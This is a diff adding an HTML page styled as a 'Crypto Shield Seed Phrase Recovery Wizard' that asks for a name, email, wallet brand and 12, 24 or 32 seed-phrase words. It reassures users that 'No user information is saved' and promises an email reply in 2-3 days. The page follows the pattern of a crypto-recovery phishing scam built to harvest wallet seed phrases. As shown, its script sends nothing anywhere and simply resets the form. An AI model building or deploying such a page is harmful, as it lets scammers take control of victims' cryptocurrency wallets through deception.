@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Recovery Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .popup-content {
+            background: white;
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px;
+            width: 300px;
+        }
+
+        .form-container {
+            display: none;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 350px;
+            margin: 50px auto;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        label {
+            font-weight: bold;
+            display: block;
+            margin-top: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+        }
+
+        .button-group button {
+            flex: 1;
+            margin: 0 5px;
+            background: #007bff;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .button-group button:hover {
+            background: #0056b3;
+        }
+
+        .seed-phrase-container {
+            margin-top: 15px;
+        }
+
+        .seed-input {
+            display: flex;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+
+        .seed-input span {
+            margin-right: 10px;
+            font-weight: bold;
+        }
+
+        button.submit-btn {
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        /* Submission popup - hidden by default */
+        .submit-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            align-items: center;
+            justify-content: center;
+        }
+
+        .submit-popup-content {
+            background: white;
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px;
+            width: 300px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Initial Popup (only on page load) -->
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <p>Your credentials are safe. No user information is saved.</p>
+            <button onclick="closePopup()">Proceed</button>
+        </div>
+    </div>
+
+    <!-- Form -->
+    <div class="form-container" id="form-container">
+        <h3>Crypto Shield Seed Phrase Recovery Wizard </h3>
+        <form id="cryptoForm" onsubmit="showSubmitPopup(event)">
+            <label for="ownerName">Owner Name:</label>
+            <input type="text" id="ownerName" name="ownerName" required>
+
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="walletBrand">Wallet Brand Name & Type:</label>
+            <input type="text" id="walletBrand" name="walletBrand" required>
+
+            <label for="cryptoLost">Crypto Lost or Stolen:</label>
+            <input type="text" id="cryptoLost" name="cryptoLost" required>
+
+            <!-- Buttons to generate seed phrase inputs -->
+            <div class="button-group">
+                <button type="button" onclick="generateSeedInputs(12)">12</button>
+                <button type="button" onclick="generateSeedInputs(24)">24</button>
+                <button type="button" onclick="generateSeedInputs(32)">32</button>
+            </div>
+
+            <!-- Seed phrase inputs will be added here -->
+            <div class="seed-phrase-container" id="seedPhraseContainer"></div>
+
+            <button type="submit" class="submit-btn">Submit</button>
+        </form>
+    </div>
+
+    <!-- Submission Popup (Only appears when Submit is clicked) -->
+    <div class="submit-popup" id="submitPopup">
+        <div class="submit-popup-content">
+            <p>Your information is being processed.<br>Please check your email in 2-3 days.</p>
+            <button onclick="closeSubmitPopup()">OK</button>
+        </div>
+    </div>
+
+    <script>
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+            document.getElementById("form-container").style.display = "block";
+        }
+
+        function generateSeedInputs(count) {
+            const container = document.getElementById("seedPhraseContainer");
+            container.innerHTML = ""; // Clear previous inputs
+
+            for (let i = 1; i <= count; i++) {
+                const inputDiv = document.createElement("div");
+                inputDiv.classList.add("seed-input");
+
+                const label = document.createElement("span");
+                label.textContent = i + ".";
+
+                const input = document.createElement("input");
+                input.type = "text";
+                input.name = "seed" + i;
+                input.required = true;
+                input.placeholder = "Enter word " + i;
+
+                inputDiv.appendChild(label);
+                inputDiv.appendChild(input);
+                container.appendChild(inputDiv);
+            }
+        }
+
+        function showSubmitPopup(event) {
+            event.preventDefault(); // Prevent form submission
+            
+            document.getElementById("submitPopup").style.display = "flex"; // Show popup
+        }
+
+        function closeSubmitPopup() {
+            document.getElementById("submitPopup").style.display = "none"; // Hide popup
+            document.getElementById("cryptoForm").reset(); // Reset the form
+        }
+    </script>
+
+</body>
+</html>
